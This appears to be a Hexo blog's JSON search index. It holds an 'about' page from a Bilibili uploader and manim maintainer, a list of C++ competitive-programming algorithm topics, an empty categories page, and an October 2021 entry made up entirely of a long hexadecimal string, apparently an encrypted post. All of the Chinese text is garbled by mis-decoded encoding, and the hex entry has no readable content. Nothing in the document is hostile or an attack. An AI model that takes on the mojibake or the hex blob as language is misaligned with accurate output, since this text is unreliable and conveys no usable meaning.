{"pages":[{"title":"å…³äº","text":".intro { text-align: center; font-weight: bold } .intro a { color:var(--font-color)!important } .intro a:hover { text-decoration: underline } .intro p { line-height: 1.75 } (ï½¡ï½¥âˆ€ï½¥)ï¾‰ï¾ZJUer | å“”å“©å“”å“©upä¸»é¹¤ç¿”ä¸‡é‡Œ 3b1b/manimé¡¹ç›®Collaboratormanim-kindergartenç»„ç»‡Maintainer INFJ-T | HUFFLEPUFFVSCode é‡åº¦ä½¿ç”¨ | Python/C++ç±³ç²‰ä½†ä¸­æ„MacBook | èŒæ–°åˆ€å®¢å¡”YOASOBI | æ©™æ˜Ÿ | èŠ±è°± | è¯ºå…° | æ–°æµ·è¯š å’•å’•å’•ï½ï½ï½ï¼ï¼è¿™é‡Œåº”è¯¥ä¹Ÿä¸å¸¸æ›´æ–°_(:Ğ·ã€âˆ )_ä½†å¸Œæœ›ä½ èƒ½å–œæ¬¢(ï½ï¿£â–½ï¿£)ï½ å†å²è®°å½• è¿™é‡Œæ˜¯Bç«™upä¸»é¹¤ç¿”ä¸‡é‡Œçš„ä¸ªäººåšå®¢é«˜è€ƒç»“æŸï¼Œhexoé‡æ–°é…ç½®ï¼Œæ¢å¤æ›´æ–°ä¸»è¦è®°å½•ä¸€äº›å­¦ä¹ è¿‡ç¨‹ä¸­é‡åˆ°çš„æŠ€æœ¯é—®é¢˜è§£å†³åŠæ³• äº`2021.6.12` è¿™é‡Œæ˜¯Bç«™upä¸»é¹¤ç¿”ä¸‡é‡Œçš„ä¸ªäººåšå®¢åŒæ—¶ä¹Ÿæ˜¯3b1b/manimé¡¹ç›®çš„Collaboratorï¼Œmanim-kindergartenç»„ç»‡çš„Maintaineræ­£åœ¨é«˜è€ƒå¤‡è€ƒï¼Œæ²¡æœ‰æ›´æ–°è¿™æ®µæ—¶é—´ç”±äºhexoç¯å¢ƒçš„é—®é¢˜ï¼Œåšå®¢æ²¡æœ‰æ›´æ–° äº`2020.9.30` è¿™é‡Œæ˜¯Bç«™upä¸»é¹¤ç¿”ä¸‡é‡Œçš„ä¸ªäººåšå®¢ç›®å‰å·²ç»ä¿¡ç«é€€å½¹ï¼Œåœ¨Bç«™åˆ¶ä½œä¸€äº›manimæ•™ç¨‹å’Œç§‘æ™®è§†é¢‘è¿™æ®µæ—¶é—´ç”±äºhexoç¯å¢ƒçš„é—®é¢˜ï¼Œåšå®¢æ²¡æœ‰æ›´æ–° äº`2020.6.21` è¿™é‡Œæ˜¯Bç«™upä¸»é¹¤ç¿”ä¸‡é‡Œçš„ä¸ªäººåšå®¢ç°åœ¨è¿˜æ˜¯ä¸€å$JL$çš„$OIer$,è¿™ä¸ªåšå®¢ç›®å‰ä¸»è¦å †æ”¾äº†æˆ‘å­¦ä¹ $OI$ç®—æ³•æ—¶çš„ç¬”è®°å’Œä¸€äº›é¢˜è§£è¿˜å¯èƒ½æœ‰ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„æ–‡ç« (æ¯”å¦‚æ¸¸è®°,åšè§†é¢‘çš„ç»éªŒä¹‹ç±»çš„)â€ _(:3ã€âˆ )_æ€»ä¹‹,éå¸¸æ„Ÿè°¢æ‚¨èƒ½å¤Ÿæ¥åˆ°è¿™é‡Œ,ä¸€èµ·åŠ æ²¹â€å§(ã€œï¿£â–³ï¿£)ã€œ äº`2020.4.27` æœ¬åšå®¢äº 2019.1.9 é¦–æ¬¡å¼€é€šäº 2019.3.10 æ›´æ–°è‡³Hexoæœ¬åšå®¢ä¸»è¦è®°è½½ä¸€äº›ç»éªŒå’Œç®—æ³•æ¨¡æ¿(C++) äº`2019.3.10`","link":"/about/index.html"},{"title":"C++ç®—æ³•(OI)","text":"åŸºç¡€ç®—æ³•æ·±åº¦ä¼˜å…ˆæœç´¢å¹¿åº¦ä¼˜å…ˆæœç´¢åŠ¨æ€è§„åˆ’&emsp;èƒŒåŒ…é—®é¢˜ æ•°è®ºæ¬§æ‹‰çº¿æ€§ç­›å¤§æ•´æ•°ç±» æ•°æ®ç»“æ„å †å¹¶æŸ¥é›†æ ‡å‡†æ¨¡æ¿åº“STLæ ‘çŠ¶æ•°ç»„ å­—ç¬¦ä¸²ç®—æ³•å­—ç¬¦ä¸²å“ˆå¸Œå“ˆå¸Œè¡¨KMPç®—æ³• å›¾è®ºç®—æ³•é“¾å¼å‰å‘æ˜Ÿå­˜å‚¨å›¾å›¾çš„éå†æ¬§æ‹‰å›è·¯ æœ€å°ç”Ÿæˆæ ‘PrimKruskal æœ€çŸ­è·¯å¾„DijkstraSPFAFloyd","link":"/algorithms/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"Oct, 2021","text":"e1fa201b2d31525bf9f1e5c19d32d0972c907596765b0eac77f58cdd3eed557c1458fc94dc9504ad0cd5bbf23c62bfbb95138f0e18782c3c668818ca370f300a7f70b9bb3e51de3c674a0e618dfe9a6141ca2d5927615430c498b998fa12d26101375fffe94ef9b701e4bc55febe75e4b99e28ea76f2853f627b77eb564a40b4071a38a614d631503107320530be978f6efc594360499cc3f89f0fd1aacf1dff8dd051c854146422d5e0da21d7a86686617e4599ff1129034789f7396545b64ea15204fcb6e17c5897ac939684ee95828d33d35001b9677ae7cdf82ee3cc501d4d9212263d0912c0219499f14c53b3017c8d457af112a08f15d78611255ed1597f07a170708a31942e1e8e751bbbae94c0e58322856772159e6a536947c8fef9d877465b8d268923c21b211ea1db04c1f96471d94231b18f5c2ecb3df1661c94db664eddcd132dd8ecab015cdd2e1f5b18e0c88176a22fa8c3e8c6be8cc813c06604c5ea071a19c8be210fabd54c8feb8a04dd0975752a9306863a9abdc6e989b03d83d69dc52b26b5e3023e37392d52379db3d16ee19c8229a8996ac1fccda696832988aeedf0a25901ee3866e32d138e2aae9943726e4272d7d0e654a1739a215dbbb3370c09ee30820f10c7e791c9da3ad64b414d5b0537fb6ff94d44b19c11aed9ec033fef3bc14e83864a674153af5ccf73e64cfc6201443a32e2a8b510bb9953dc6a5c0ede365238c354fdb313318100051e8d48a1505a3b1424bf03d7e4a1e51e1aee09a39c4fdc06599275d8ed2c022f5fe445c2e1daa9f20343c4defa471e3b16b43ceeee9fa5cfd38f1d7ba5f01cc8c2d1fbde7d2712633959199e09339878676ec561283ec92db96c61c8e8a0887c2c6a3f40c6bbe58ed8e4efdbd416ac6466b042405fdf2b7e708e589a4f39af6fbe346d17615a090dc53d070fe5a145024dd1f2d105fcf12d0cb509b69e0c02d14f3946b20a6e5da16adf7d3e82ce331ced11d5e10c160c1efbfc6c4e99c95fb0cc90d7a19fa6a2ae89c7021071ba1f386212a8d4648cb31e6a57ec14e8482e297b2a6948599555110e332f00c9981b7afeb04dac16d1043007018dc8b7e2c9764085e9e0a477d9a79fe1d9864a86e0b79edb8817b22a68d04c2938335e4a8b422b2de377dd3a4b44cab916bb8536c7a257153384da144398a55adc91507bc5ff0112b631a4a1a429ecbd749d0f92c9c48975c1fb4bcb493f89631e0995f42aa77bfa8014ecff3d0241d3162862b8553b935f0fa659cd1c2d22fde7f4372c727a6f7798e9232d1c08f3f0f7d34de0ffe22b51bb0461e18cf15e140f907f281b09d6cb6cf406300fcc6a2ff717e47227bd688cac3ec029152e56fe8b62a62b6ca037c6c835592e1e37df77a125c6ad34216cbdd7a4770f0bc4d37a81d09a2318f705d3757a65b6a9b07996acf5affa814ef3548d8055ffee1a8a4c3c9657b96a3b43f7a9e53b81f3a0bb942131987df362185279026fcf06c78bad548b8239ffb2cda4e880da3ccca648b147808834e39bcb5365365c4117468a1dc43e3dce1ed44dedfe9ef6eef225c112f7ee2dc1261c74fecaee7831e0618153fe09dbed85d547b8d0cf8733b201b3ed14731bdf3727325b12bf8721a0871bbb5cce3a0df6a5ea1b9e519ecf6126310dbf7d85f613812d2300294c721b04406b00c2b168b3b95a338973e009ed0445eb11deee13c07ac89f6d979623c5e8d862370b40f2b30ad5edfc022ef9df945aa8f69f46fc78c5e32ed7f2ec046d94e51e36a93d70b9630ebc12cd2b22023f19a740f0560de5fb169efca7a0b15ad0ef83920c0a70d1e62203c3c46a828c49b2c8bb08d3a0700b9ae3721b70b2f1a2f2c8feb0babf640ef4a874fd35128b46ede6f85fc1cf4c0c0f4842c3b2c24d6b453e92a8de82e67cde34d6c9c58d1c7ec168c82aa6dee565dcecd62134e7b9f38e0feb03c2670b2f1b367a59f34728142763b393c665f20dd35e264922db62af61c197f6e01c6f8a8f4e0cbd331990a3a65d9ba15b8accbfccca620605c5ed0f6a04fa2dd2fc729b43f77afc1c2b2b45ac56a3f6cad6b28c681d6678e6c7fd0504e6256b504d2f20ea9ec3e50d415e1029b75930f1edd01b2baff089f6efc7c794a0ef0b8467949a92415fc115c13f3341b90c09d8804847e57f0db20e9f3d29a787cdab95681900c26a3675146e468680901c0bc89f2a75c684be62ddfdd4506a89f3fc9cbd8837c6aef40e37b56899a4a129e4e15b2e1e55fdc928fc9f23eaf7a3063ce14d644b2552bb0d21e8acee3c535459ef87dab16acc86ff833cb20017f6033e8ee23c214a6b55bea01a764690e02bdf16882ec7971bd58121dc9dabd80708b27f1095d22d53758dbf54e2c423ce11382982dbc79041d971a8a712e58e5594b2cbf2edc2335e30eb27df6fda641af86e14a4adc6e2ff33d8752bb8b3744fa9383c2e8e2d7c101bb984f5f580d53c116797c05353d820c9b44e37cb30f762c5848de45674a8cd718b35183cb296a04f3195700d023e1c55c74429d46abfbcfd3b9adf4f6bb70838a271a8cc854df9e5a266fcb99d79b25d012577f9786822ad4b5d6401b75e67121b2d391cdb6e8b3096486110f4be065dfc1121cd676f5262a1985a05427da5b3b3a0e34b279743cbca06350ca29f9f2e819683d23c23d4453cfc4d9e9202be51960b717b5059347c2a61b91e69373f42364b1a234d99cee8bec030523d65a00eececd9f682b790d7e18bc2064cffab23322b8644e070299c7e1e69d4f6b4f999d8044ada0ab2452b6d020182e22ddeaddf9a0b0d71a8bc7751b7a785766549835130a70ced62d80811ce72f4c4d0b6232814a8dbb9433843b284db918543a088c0463872dc9cb539831a146450ce96ba348c8665180c50f82326ae8d5e2a553bf938ff80b8ae6b5ab0716c4af4f34944a4497a13f32c39b19f563ecee46d1a4ad069faffc4773de67a0c3abe3cf147c5a44fe9304fe49edf23c76ac41402ebcd56c6d77f14e6ba79a745d09186ffbd5a1579b60a176680ee28e1fa189e3c413b8f840a32efa40fd273ea8e5c415640691af118913d500655d154c888fed8681a7628c78a60e60b44c521d321d0f8b288cbaba273729d72cc548d29848b9ecad9e6b839a58f35c357d2a35d627590369591b27f3914a9dda4a5ff76dda3e10d74e20124cc2bfaafbec8b1be86dba37b00e4a684dfd4fa2276380838e3de6430dc9e46906b0ac2df0da398b9a45d7c2fd099b724d029c725086b48ce48f1a489ce89f213d4ac562d901e4a9607962132036c07209df1d5b65387a5ba88398ac34f0ce231220caef4e9d26c5be735e2a643a71370cc8289bc57bfcdb1e9bd234b24ebd1a7ffdb0d4d568b033e73b5e0c5464f5a7ac4d7801814209290869047b38361e527b8c399656ae62e586a80980a05c818477a7d13dc689df265ac1c32162871a568ecbd5f3631fa1f1a53d06ca8adcf19135defedeef3574355449ea065190e48d0e873a67db3b37f6a2fc9d914aa4b9af5adcc626df8da96d958160914b952b817636644b66e45368d479e303126058ad9bb4439870125fef273bdbbe1ad47e354c07fcd2a06cf7366a8eaacec7347668939f6ef6389b9ee2f2d2beb972b180fe1c1a29f8d6e15b749a9fa53a535be783dc9f6e3f7963d6477d612bb6a8ffb554dc069af3158a0c78fb51fe013bc390c4cfb07ae4da2858a33f44abfcf548d4b29b34314743155a03f355c78ced141f69e4d1de0936d68271a5ae292698fd59be4628df149a5f5b3bcea6133e908623670f1374062a25a719f91e72b13a8889f5d2ba14f336c0bdd08daf0c428032d4162a1a7694d4657f372854def8b3339aff203e7de02e7213e51a455a891122f6f534d906bd44c87626bbc322770a275d1dee6573207d96704213135e311ab28443ce0fd36c1805f93ad6566194e76b130ef2fb2f4213b527e4a841478d363c65e1a0b7456a8deafbee8e3aa1759bd175a659e592a4edd30200ade9ada9c16d892bd29617e8cf16420b36984467a22c951b1598c12e911c71ee3991bdef00c1953c4b4142d04373f375b436ddd614a9972f5e5899ee40286402c6f55bfb24a64cb39fbff9be040f60ed64f208aa33ae06ff1e38aed975d3ce2c7156e33554c0130db4dc6781fb186eeb88cdc2a903dd8e8dd876389e230362fe0aa605ce36d1ba108d948f49987745b43376e1764faa58d088086bf93df0ca5589670c6bb4da7532747cffa38386c53383ef8ce9f64d755cfe514615e843d76dd5aec0789775084b94b634a1c198b57bd6ed9ce5620c4470244e74631f4a9233fdcc214d8968553b3819134eac7124f9f048eb947b8490f76f3d70961b858bc3e26150c11848a9fc3cfb7e9f9cf74393e53b4cf74e412f0bb36e0ca38d6f8c7e8872f7973c66bd8b92526858a8bfa2412e2308d6f39d8be82c2a6fdc91c6e5441f78ed460119b499263831568e7cf7d052edc0fe12167c575cc317ccc98d750f804d9659c9929b3dd216646d3b0b6d91485a1a333cc304ef8d2ccbeed675f086275cc2f9cc651222c1aa9ba5c2cff7f52f09aee900b535c7af024fd9f009a848f993c5b4abe62286bded005f947fff83cff8627b32f1eddd15339fd2c55892b290de9d6759fb7f073ebb3c7b3bef0d3456a8452705445581e64412a13a0ca412f51c514553ee304a7224a73cacbf18095e4e4acba9f6c85a9459972b66533f36f06fca7573ac3453670cac11a68fd3728578345ae5411ce8e79c0e4b7d3973840175b75e6e88052f98d92f22e8fe4df88fe9d49b08484b83b0bb8ca772dd8135ecf4253f5aedcd81b92d9200926b993af3f5a6f08365621ce2dc4aa2476cf68313248a0a3fda0048e31e836f0886df3a04cee4482a1987fdc427bf1f2bf6463cac9f5ffcabf4d4751b7b7e60a404d2b758ea71616fb524fc15c0a9d5e4241cee150093036e8eca8a60821f5bce7d30075b1d1abf4ee69fbdb452152e9244fba9d36492b61ce5f3b5e6805ee90128e287e88dc70896d3c73f72cb2b6446faafc31655adfb7e7c0e1823f003c2d9d504d6233352cb44e6b655ff35a57ca9ffbb6b48a800675df73b8033c897023ec68b45084a030e99ee1bd35ce73034d6369bc45ecd9f0645e32542fe55f3268d48cfb4de31629ad4a39f770eb250475986272ced6158c00cb653ca594acaa7856e7c3e9a38367d2d2749f93a834f05c6f26237b983a738b19206fd783b5cab34b196644d2dcd7ae305b334601b51d6c39a37ad6ac995ddd003aa9e948a3f71e924838e43de834cdbd851b44b8286d625fb1368304bedef096990e420f66adbebdd4b153c2ed409cc1fcc786bf3d72176d7fe0d234603c3d1c0c8aa93fda5b6efecb97c3b1f76db811c2da9d6906d0d31d185cb131dc0a33e82f4af9fcc9a4fe6fff4044b96853654aaa0fe8c60421d2ff1ef1b5402ea23a30d4a45a846451baaaa618c51d8b6421933d48be1dde1ff8e2e8de8be81b4644beffa70fb62e149df443684a6896c44b7b771db914eaaf01c1e40f6a6cb5c843c1c599ef0e8311efa359413f941dad905c323a7d7486a159f919e080c97ca89f07a2ecd72587cb2dfa9555b001b08395f94e413fab2e88610cdf0f6917c2c84bf48a3a809da72781cff6c5a1c068f899d7ee8ff55cd241a9d9431ccb751322171932ca784548d6caee5b32bf9fee6eea10e3e055c386cd680f866b88f808aeee49e633b88ffac4458b2e15c3e34dc71a5630ffa2701cc62f66a42c2b24a2a638fa04e63be06755b09d26bdc617deb3b6acbcc8dcfb62cdd832d81538a6327969f81445326c65be15ec071ff9f539a9e01679a15d5e98636c15d017f3ea4ead3ba3eb1abff78bbd3712b6c5dbf4ffc793b9673b085a347c282cd630d416cc85b290571e9c9ca6655df6416328e68f4ba802998e676865420094192e8b3cda7f13c11330d1ae301f5eaf617372e6899f8a59e35e08e56577b69862bdd84388ae6226815df261ca5105d77d8e7745b0d3a23273350e120e58c17d6d8c623142dc3c80b8caf9a9f9f275937d1321ec9c261aa640597cad3171ca3a9492f886733fca37e8531c38d9b5fa9b689b1361801409524b838459b6d886289df67321d861c0fa8595bbef44252995f1b5cc8ba0683537ff5a9847dfd7102cfca358609d182535a974b850e789d1903efe2b2fb670e0d61ecd3596a44a47318dd66863fcd101772760f7d27516776bfdd6de3776a819c24185f81063b79fdbbc1898c0e3571019f72c53b4d0f033df6310615d897ca01cc26ee6c46855e8d261b3b8eaad426f536e888482c69674f4ba871d69ca8567bb30f19716d267fe753e43758c91c08820ae7796665033085308e6544c491e6ae6b709a7ad2a180942edd836e93378b79ae1dff6785f412217776a1ca65d9922db7442e463f0cb9dd40dbde430dd0bf54b6c83a74f950a092e87b0ad11f7fa1593d416f1fc56c32a01c1436e928fa0eef24544c649a203ec0488bf3c1c6eedafa35356849752cb09c0a57a895f281ed639a9a87bd8510741e633b40078ab39ad98979069e1ea586e6fc421093626f06fc3314a2b1b7f7c1f169049ecccc46097f218cb510a32a5e5ee9fa367d1fae79d3f74ffe4be94ff5a336179b593e4840783565e3708ecc264c69313e6749d559a6b4ce08745ce05ea8116467ed5437730f9c178fbde2483424be6fceaa49fc7bcd4b68fc18a63140dd0c1ca45bcf5d7a62dafade1950413b61cb94587756ea5362de32e387b29e613cdafe288651fe00a4dcb548335f8a35549c0ca472575f41e7ba196fa468bd6bf52f56115e8c5e37e6936736fa62f131dc0ed3295586122aa907d8510e047f8dbb18bf2a09876e4189bf61978896d41787ee7a221ae5525f7974163a00aeda509c6ab454f96e4fb9c257f1b59e7629badad54882991f5d363afb916aee0739123ede15a5290fc95f3dab28539e258caf9ebede416bc7792b4e36700ba44f187c86dbd1efa2aa33e042b827a0d5beabd0821c3023ec46763f809b12d5e28aafeb767efc572cdd6d25527f56adcc7c3d798ba903f448242117cd323ebd2a3fbeb1af52ee84b23d818450da7c4432cb337dbf94b15d70e1145193a464184bbcbeb5404fb4a7d925af2705fe21c6c68d6d95fbc79be5c933f4354201330285bade2cf536fbd316d6c3741bfbb67e32d924453485f3c18e77031f889b5b98be15d807f0ff429adf81dba9fc7a3c79f8b7d2e5dc1131d04222738ba253bc83991e3248cceb73b6669059de548c852c523cafea31b81c489ef77c0297cb6d75c0c62286430b7bf55ef9c22845f3e640fba891696a446df85cb3fbceb9e9d4354eb42595030174b42a99d9aa58de455126316f969bec2eb3c5d9d8be9be3c782adceea432f8bc63f2279aaf838b6136092455ef0c531b5d074391f662adc2726d8427af0b5ab760d77988d02940936f0ed5a1504126549717709fc7574dd82e8a202551d21a72b1ca2e13e67e30afdee4e3be21570df0935df9702beeb3e99afab1dda96827eba9b45203becb5310768ee5be713b91a6c83ac616283055719ae18971374db9550cdd263235faac2f212de6456869744a2bbc3fa24a1d8c7d21654cba08927a1cb1f4cbf1c50a8b356ad1d10c957da4acdbff70a0cbf995944ca52e6faec1fefdbdc3fa7b285edfa18328ee80468bd08d257c11aedfd2b3b38c7b36efb0244b5eb8cf7805603fc018c095575a72b62b812bda166c4a3d72e75c6e241a130d2b7e62395673994194dea85bcfe1ffd2fc75cc6461d36a6a3761d20a10d04ecf3a170e6989518f21789ff582490dee79aa154a989e436e7a49e0de5f7638a70e98bbd1551e2e9ad66592a2480575c2eded4c2d776c74336c6ca7b2fbe5ae43b18a5ecae9dd153298251608e617d16bd9f908cb0e726559111264e09644ff78bf1f32df9dd1cd5e976aa3b6f0443081504ff488e8263df3041f69572d58872b2b1e9bad22fc892bb919476fa5d25d85829595beb26a23342f383a39a417cd772844ee05fe7faf1a6080d35a65d2ba4d08164366143f55e61b5b7d83c7ce4732e21f5ef4e40111d08a8e477e156a0e199fce806d8bb343ca7d1324f80a5907abec2c09bd8b2568e4d4a5406dd3b328be95a27f3d0723f78a8b38c65144ca20d0be4522c96aca4e115f71af42144e0288b955cf908fdc9a356067c13bf1f5a1f21f0b316bfb42a5bacb4d952f4445e1db9732b9f8c8aa5ed1b64ba7da5403feeb163759d5c94fc9e243ceca4ab65f9650da00ee53afccabc323959316024d49180fc28c187e561c6797ee681a1d31ae5cdfbcaef2845e231c0df18ab9a5d52d359fb8faf44acb0e6ca09e0a38949401241dd0f134d86624cb829494c47f39e64497e2da9f32d21da6a389347b60d1c383117461bb5798aa2dfd5bb7de2887381971c22f7b9d15ee99f4d1b7f3a5f9a3a6954299a0b1f0f29d3ae71083fc90a5e5af8a48d45710f73066f6f7f9290a8bc826b70fe9a683515e55521a82d3212ba60e855cc9e19ff3d9f894c170bafbbd706152ba6b62ad0ed11ea28854ed5378da1c83229656e56ac8c37d65c9c30feeb5acedf9762560e2af9755ed604cb40cc3c37941b87098b29c728f11cb4e6e27a63935d6fa8b616fa62bd9c26a02d442e1f1b6df6b66a7861ec8f5faa59d2f941f847466bf561aef3ae4124a62e9f8394c83532b3840d54a3fa6e1e082cf799d62d7db7ad3fa3bbf26640b88afca31800f344505ba0886095f52066aa19e405acd7f3b1208791587ca2496bb2df269e978591444581224e6fae54ce3fc9b3a15eefbff40f51d623910fc274fe22a21bc20f3bf101764f520f58dece515f91c2e39395195bfba6e43fc7526e32f32d250f85952f25bfd3ebce4bac2f35e60d39cb94bbfc61598667d2f879d8be0f67b96703b161d49978ca730c6734e948dde3efcff2c9139c88d4abfe6d633eb13c8a434aa4dc780f1067615b4ef44f8960d90cc3ad0a8e2f2e150ed51d406f5f02ab41984a0870634ccb3c8d04cf7a9619677e43979a032b74b8716e772a308161823837b828cae1adbdd1799d628c580497022d536e23c202a8c8c29791d8c50b771616ef86671586c6cff2ae945167e4369262cda013a4b5637ed95f4b5aea3ca8b9b230892392123a717055c020804fd1ca059b57c2fca0106692bfc2faf233af5b3205dbbc13d14b567603cc122ae8bb1c245dc2ca145a19ba21a3ea218bfebe9c0052a84f9b5b6e9f9b133fff89e275a6197ecd8d210c74e012e4fb8091d9905852be27fd4b5125df271fdf6f7abb2ccb9023dd1176301d39cb87e0a007c54ab2ef9bb58eb06ef2076b7ffd69034dfb50b81f5cd1941690a9270aebc77397fd6dd8a7dd9538876fd1eb14cc32246bdc0102fa09e60d2418e34170b709b408373751dfd7b255c38102a60d0436f4340749b90afac787fed6304bac479434158ee47db8812ba0ffa1ceaf1655d1598fc7a15502ec240d35d06de860bad247a64eeaf935db1cef68fe3795f92a323c0d3278bec71827b007d523672c73853a8931ce0c25b9ee1963e9efa75b1ad1df1d5a65939503a0afcf7dd9785cc8412bf5f72cbb3f405f6990b74fcd865d63869f526018a33b957ee26bdcd341d8e7fc68370af301cc6b305f6bfb0cceca008aac85097721cb119c649e59cc6f01ebebc9c8c6fe33eaa433cc52fb2846cf1179ac2701247195115ffc8a4e77635660ebf278516798f66a313ae6e3f4419a0997eda2cec895b8c4966e208c66775b8881b73f2c113bd945cb208f65dbc41189a09b8b1c97a669908897be2865890af3270b4957c28fa2432e54bcc5d4a0f864436b48a5860af13a71d6485820125125c1738001f90f8b1168fd89f9db2fe24a5cdf5aae40c491d7d3f8360d81f9e378737a99fbb240e4f2f4d98663e4e54daae731ad671b2d66f371294cf56c8ccd4526db42145eaffaf92f35d472d4027afd7758fc59c2ef594f68ccea148564660ef87fe3d3e717e657ad24c2e2cec62f8e4bf28b89e3ec9021f87566dfadac69d111425afe9ac22418d79e60230fa9137cf832e15df21b1b9da9357743c6e92acc8ca7c2f6375ce07f27e79a583ec16c2ea6a5b5c93120de8f67b64f7a3f24c5968a647e2a222a15ff7f2877e184093e600c1a141ba08001497fce3888b168e98ba3eb27bd91df5440872157a25dc1378e4ac14c5ad3f649d7171bc85fdb7176bd3a1e0cffb6bb7fb3f0a675a647b9723e5f18491a5114a7d7cd3c04ce5fc5658ba1e9c914d04657112f2841e7d0142c803f52f2b918a773c3abe034b6cc5c3a6e95bf14a87236d5dda45c0014e1b9ada92a116e2a303ca7477200d68270f6be748c7c0312fe998a727074990b576a48d0f8ed9e8aed02b16bd360acb152ebde717d6a5e7d2e85b2e73439e7b6385a1892565465d173e5d48b383bf19ae233b4d70b62df0a10b66c9af577a39765bd8140465aa45339ca406507ebcbadc18992528ec41f40b4710f9035e769231ff2ccb08ac50df259f4c6d94a870aaa9b93d9a3099116be3ba26e55532933e6d63ee336019f80e7eb076ec102a9143e5045da5e08becefb72cb3601036863dc2f6779aabf10310b443ae9be3489b2cae3cdef3369ba84e908e121bb48694bd30b04edc8aab74ad5814ea1ff2043a9bf86f9ed0c0ec7356798ba4001e5e059a509aea085ec35dd57155cfcd18778bc499d49a4607dbd813d2833416c53180ac15508c5642d290861ebdf9d2c39bf845be723b156e5b752ab5f2c032936f7ef72e764671a1ca09c883186021f80ccbbad1f7dcd1a8d4b2af958ca618ec7db340602a18e37783221bd7f3978bbc4e8c36b0cd300cff162ad241da220c326ce6487ae5c14c23aad14dc4bbcb504e6c17d4fea3163c47f7a830a1f0f10e03e300e66a259aae8f52a3c9cfb9c75c20b4a88f3f961afe98612bf793da03ca1e4034a2a9020ccbb0dd9b11b53e3a119cda9517545b8199c09323bc7d66077382661a4aa22d5a6c8ce0729786f058fdef92f903b71d639d39546b668e54b30e25cd6eeec77106e26cf34b3995836c30a8c9df6d303af464d7f6b04a1126c1a74ae0c3e4bb27685b66680bc07df4154b5d5742342316faaa87f42e682e61e08cff8246a17711c05e26abdfb24701424fddddfe9aaaae48d25fd6c421d6008de9abb309c7541318effad58ba2879dfba75637f8cefc3609e1bb62ad393c619f6dfdb8b85c24480a8dbc6c2f9b2b3198a440adb36348788eb988d93f9a47cd41a389019dacac4524f3da6323ecd7771d260811ccf14a3ee3d80758a5a12e08db9440a5a954ec5d765f2d197b5a9c36d8b968c28ea2862602ad55357bfa84660d76fe7f075ffc0ac23e4d19f6427352b79676895e5dd870bad0aa4dd90daec68837979e884c497fcd948dc1e72504ca3cf8e034cf4e72a14690c4541ff181d54e19fadd60055af23e8250b1bb1d65c7a53339387c459e5dbfc6f6f92dff111f56cb524c0bd5f1c44686c20b8caa1fb106578c96da9045aa0e2ae239ac80bc8b48ec2406c432581fb081ebc55201d9c857665a4908240e2d64f488f24531536daf249c5c3ab36eb398c18a03c240233b7b30c3a4ad4d766f2c5e928a54ae94046a47f89f00baa57b6958e6145211363501636beadb6afba20003c9614047d38a050922c8bee7ae07289adec57cca9586df8a00b29f911e6630e0ae27e61d69c3506342a6f431042cb3a521dfd874022db486fafbe66aebbb27e38f6e16a0655d8362d44294769419b21bdade50c34cc39ea9830e48431300401d78eb9143c00aea40f351c9e05d823286829111c196c2e9e9c4bb1879e427f4dec67acf8c899e7bcd4e7361f1254641d14b5af314a283fc495f3d84fb21a6489bbc506cc539716e8023f4884e7fa227a97e5e0c4d1ca6c589be55c470344fb3a1b54982ae12caae14ec027ac9f5f721f544887d1f7760ed7fd6a569a808f652707f75a9e09bfc8bd303556178b667de63a494bd9943c242211564dd2d8d87ca1f2151bf5330311aafd6ab50a6e209dc327cb62be9cf63017a9cd65796eead7480c551a32883d2d3aed5989527515c1762d8cfb340ba1f4fa2e6dd8ebf4eb3e629a22987e55b6fb34aa896716b70e3284fa12ebe5e86c40aa63a5775ff0b7c705730f79f62f4276e0e48a34ca0fc481a17fdc3d91660a89447d1f9eb8d9412d3c669eb92e3615c7bf59dd121203e28b0606343ca3a131e512430a73d1dff617b0990f194329b3cbb0ec3d3e6d87d54a8bb77a5869a4eab56c17c83928814440d78a7b03f4c5747fd18de1c23d204ee649d034e0c999fe5c44b708e02c0dd938f9316b80f06801b30d982fa78aacbc97d5f968bdfd6a6af4eb7efb6ba650b770da5e5db9a3e2959b19a398e9cb5eaa9b3bf95904410db530617887bf39a9b641ec0220879be5465e5598fe98ce9b6b326388879cedb9f178871e0a30c72dfb7f0df3e3f1fb35c1cf17933c26df7caf287a15096f0cfb87505dca2efbae82236e2aecfbf94783ec84268b344e87fe6cdc9ad2ee3768a6340b097a2c24574162f0ed38343af6245d0ce3fcae36afa6e988b8a63a4615dc98126be451a729884e6f46d2c22b27d396c2c31954e0dc697a578a7ec3321a29afda6cb1a7bdb9bae5d2451fcc0f34cfa10fc2f2a9380bbec8b62eab0cd24d88406fed238e7b77fb7367406dc757ba43f024ee607cc8c58b82ce65f8cfe3570733c45694875037152a335d9f0d0fa4ccdf3ed1e9e7407e58a8b17c87704740c77be5273ac0246caee9f54679cc87b96beadfe3f4cf0280ddbd72e890d3ff8ef2ade416523daf3b61a068421c7eeb082d82e5b1a0971c1af3b9d54f18bb5d8dd95bff2e69e911d8cd49b0a69a10687f46b918b781bd0c57a39fb0fc87c8a56c58e9675694eac681ac3c94f6529575ab5f44cbf1b3a704bab54e0b3a328b3a589186cdb0b5cb62c0663de859a3847da46c79c0a8bb7566d8c33f9d91f29cb7da206831e0b20c56ec52a81c5bd471135582e5e7e56fa28f12d2d1f8a41a639ff7cd8d22bd6a61b3642742a4613e19421a21a9b39372ad558fac0d126fab1048c8911230410a5fcc9f0180595f993cdc92fe453aabf257391a407b768d12b050a1ea4ed190cc2d3ca36675095d9807f870d24f860b2d65a1fa7a39a46509372a59b308f3a86a11700b66c6da65607577aa7f407f17ebad87ceab77b082148cd59c105bfbc6479bd7b497dab232e6c7235cb0637fe173c61618b1a0f69379438990719623a2f2324ea18fff71f02d1f8dcdbd4a55068cf9afb83d5a752b0afa732e97a99ecfab6637668830a96afe4c44973b3b5a9f64c5391f53cc72db69268975468397395fe2546021c543fe9ee24a2e6320d8a2a194f054ace70dac66895b507a72e4ede45fbe507c0ae5569d608346b42b094b200658b84f7cc5ad7eba8a375c314e4ca695d40519308ac282fb7e732283c02e45a4b5ca27ae5994db6608cd32698670b0156352df0dd57d230535ec4c4598f2e5d17579ee1b658419513727d19e6181ce478fd9ecbdb569831c8f54bb1d7addb7c0adddf18d5729f569e462a37062215894ed788c49ee8231ff2477664537fa272053c83f54ab3b8fbde1ca3f1c700d3e9e0a1bd9a4da6696572976a6240b843e4366fcac25d236e02e4d2b1fe33c2b752931c216bff559d9b68cbc76c03f39c240ffbed046865c2fbb60bbcc56dbf76f2a99cd5e090db89bf2e0fa9899c4839dc74515958730da97f4c602b9bf8a79f0436d67e861c